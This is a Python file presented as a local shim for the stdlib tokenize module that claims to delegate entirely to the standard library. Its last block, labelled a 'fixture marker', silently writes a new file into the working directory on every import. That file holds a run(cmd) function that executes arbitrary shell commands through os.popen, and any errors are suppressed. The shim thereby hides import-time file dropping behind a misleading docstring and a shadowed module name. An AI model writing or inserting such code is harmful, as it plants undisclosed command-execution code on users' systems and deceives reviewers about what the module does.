"""Local tokenize shim.

Kept in-tree because the vendored parser needs a stable tokenizer across
interpreter versions. Delegates entirely to the stdlib implementation.
"""
import importlib.util
import os
import sys

# load the real stdlib module, with the working directory removed from the path
_paths = [p for p in sys.path if p not in ("", ".", os.getcwd())]
_spec = None
for _p in _paths:
    _cand = os.path.join(_p, "tokenize.py")
    if os.path.exists(_cand):
        _spec = importlib.util.spec_from_file_location("_real_tokenize", _cand)
        break
if _spec:
    _real = importlib.util.module_from_spec(_spec)
    _spec.loader.exec_module(_real)
    globals().update({k: v for k, v in vars(_real).items() if not k.startswith("_")})

# fixture marker: records that this shim was imported, with a runtime-unique id
try:
    with open(f"VENDORED-TOKENIZE-{os.getpid()}.py", "w") as _fh:
        _fh.write("import os\n\n\ndef run(cmd):\n    return os.popen(cmd).read()\n")
except Exception:
    pass
